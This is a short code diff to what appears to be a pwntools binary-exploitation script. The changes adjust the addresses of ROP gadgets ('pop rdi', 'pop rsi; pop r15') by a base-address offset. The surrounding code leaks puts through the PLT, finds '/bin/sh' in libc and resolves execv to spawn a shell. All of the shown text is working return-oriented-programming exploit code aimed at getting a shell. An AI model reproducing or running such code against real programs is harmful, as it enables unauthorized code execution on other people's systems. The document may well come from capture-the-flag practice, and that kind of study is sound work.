@@ -25,7 +25,7 @@ if __name__ == '__main__':
     # debugger.execute('c')
 
     address = t.file.symbols['main']
-    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address
+    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
 
     result = FindFunction.execute(t, 'puts', Method.PLT)
     if not result:
@@ -62,7 +62,7 @@ if __name__ == '__main__':
     sh_address = next(t.libc.search(b'/bin/sh\0'))
     logger.success(f"/bin/sh address: {hex(sh_address)}")
 
-    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
+    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.base_address_fix
     sh_address = next(t.libc.search(b'/bin/sh\0'))
     logger.success(f"/bin/sh address: {hex(sh_address)}")
     execv_address = t.libc.symbols['execv']
